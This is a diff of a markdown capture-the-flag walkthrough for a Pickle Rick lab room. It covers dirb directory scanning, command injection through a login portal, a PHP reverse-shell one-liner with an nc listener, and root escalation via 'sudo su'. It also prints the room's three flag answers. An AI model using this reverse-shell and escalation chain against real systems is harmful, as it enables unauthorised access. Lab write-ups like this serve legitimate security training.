@@ -39,59 +39,192 @@ Nmap done: 1 IP address (1 host up) scanned in 12.83 seconds
 
 ##
 > Scanning for Hiddend Web Directory Using Dirb
-4. `dirb http://{TARGET IP} -r > {FILENAME2}.txt` to non-recursively scan the target URL for directories using Dirb's default wordlist and then redirecting the results into a text file
-5. `cat {FILENAME2}.txt` to output the scan results from the previous command
+4. `dirb http://{TARGET IP} -r /usr/share/dirb/wordlists/extensions_common.txt`
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ dirb http://10.10.29.218 -r > WebDirectoryScan.txt
-```
-```bash
-┌──(kali㉿kali)-[~]
-└─$ cat WebDirectoryScan.txt 
+└─$ dirb http://10.10.29.218 /usr/share/dirb/wordlists/extensions_common.txt -r   
 
 -----------------
 DIRB v2.22    
 By The Dark Raver
 -----------------
 
-START_TIME: Mon Jun 26 21:47:28 2023
+START_TIME: Mon Jun 26 23:35:06 2023
+URL_BASE: http://10.10.29.218/
+WORDLIST_FILES: /usr/share/dirb/wordlists/extensions_common.txt
+OPTION: Not Recursive
+
+-----------------
+
+GENERATED WORDS: 28                                                            
+
+---- Scanning URL: http://10.10.29.218/ ----
++ http://10.10.29.218/.php (CODE:403|SIZE:291)   
++ http://10.10.29.218/.phtml (CODE:403|SIZE:293)   
++ http://10.10.29.218// (CODE:200|SIZE:1062)                                                   
+                                                                               
+-----------------
+END_TIME: Mon Jun 26 23:35:09 2023
+DOWNLOADED: 28 - FOUND: 3
+```
+5. `vim {FILENAME2}.txt`
+```bash
+┌──(kali㉿kali)-[~]
+└─$ vim Extensions.txt
+```
+![]()
+6. `dirb http://{TARGET IP} -x {FILENAME2 WORDLIST PATH} -r > {FILENAME3}.txt` to non-recursively scan the target URL using the custom extensions wordlist we created for files and directories using Dirb's default wordlist and then redirecting the results into a text file
+7. `cat {FILENAME3}.txt` to output the scan results from the previous command
+```bash
+┌──(kali㉿kali)-[~]
+└─$ dirb http://10.10.29.218 -x ~/Extensions.txt -r > WebDirectoryScan.txt
+```
+```bash
+┌──(kali㉿kali)-[~]
+└─$ dirb http://10.10.29.218 -x ~/Extensions.txt -r 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Jun 26 23:39:06 2023
 URL_BASE: http://10.10.29.218/
 WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 OPTION: Not Recursive
+EXTENSIONS_FILE: /home/kali/Extensions.txt | (.php)(.phtml) [NUM = 2]
 
 -----------------
 
 GENERATED WORDS: 4612                                                          
 
 ---- Scanning URL: http://10.10.29.218/ ----
-==> DIRECTORY: http://10.10.29.218/assets/
-+ http://10.10.29.218/index.html (CODE:200|SIZE:1062)
-+ http://10.10.29.218/robots.txt (CODE:200|SIZE:17) 
-+ http://10.10.29.218/server-status (CODE:403|SIZE:300)
-
++ http://10.10.29.218/denied.php (CODE:302|SIZE:0)   
++ http://10.10.29.218/login.php (CODE:200|SIZE:882)     
++ http://10.10.29.218/portal.php (CODE:302|SIZE:0)                                                                                                                 
 -----------------
-END_TIME: Mon Jun 26 21:54:32 2023
-DOWNLOADED: 4612 - FOUND: 3
+END_TIME: Mon Jun 26 23:53:16 2023
+DOWNLOADED: 9224 - FOUND: 3
 ```
 
 ##
+> Reading the robots.txt File
+8. `firefox http://{TARGET IP}/robots.txt`
+![]()
+
+##
 > Inspecting the Home Page
-6.
+9. `firefox http://{TARGET IP}`
+![]()
+
+##
+> Logging In
+10. `firefox "http://{TARGET IP}/login.php"`
+![]()
+
 
 # Vulnerability Identification
-> 
-
-#
-> Step
+> Command Injection
+11. `sudo -l`
+12. `php --version`
+![]()
+13. `firefox "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"`
+![]()
 
 # Vulnerability Exploitation
-> Step
-
-#
-> Step
+> Reverse Shell
+14. `nc -lnvp {PORT NUMBER}`
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9999
+listening on [any] 9999 ...
+```
+15. `php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");'`
+![]()
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [10.6.54.63] from (UNKNOWN) [10.10.29.218] 53980
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
+16. `ls`
+17. `cat {SECRET INGREDIENT FILE1}.txt`
+```bash
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php          
+robots.txt
+```
+```bash       
+$ cat Sup3rS3cretPickl3Ingred.txt               
+mr. meeseek hair                                                                               
+```
+18. `pwd`
+```bash
+$ pwd
+/var/www/html
+```
+19. `cd /home`
+20. `ls`
+```bash
+$ cd /home
+```
+```bash
+$ ls
+rick
+ubuntu
+```
+21. `cd rick`
+22. `ls`
+23. `cat '{SECRET INGREDIENT FILE2}.txt'`
+```bash
+$ cd rick
+```
+```bash
+$ ls
+second ingredients
+```
+```bash
+$ cat 'second ingredients'
+1 jerry tear
+```
 
 # Post Exploitation
-> Step
+> Privilege Exploitation
+24. `sudo su`
+25. `whoami`
+26. `cd /root`
+27. `ls`
+28. `cat {SECRET INGREDIENT FILE3}.txt`
+```bash
+$ sudo su
+```
+```bash
+whoami
+root
+```
+```bash
+cd /root
+```
+```bash
+ls
+3rd.txt
+snap
+```
+```bash
+cat 3rd.txt
+fleeb juice
+```
+
+
+**Room complete!**
+![]()
 
 #
 > Step
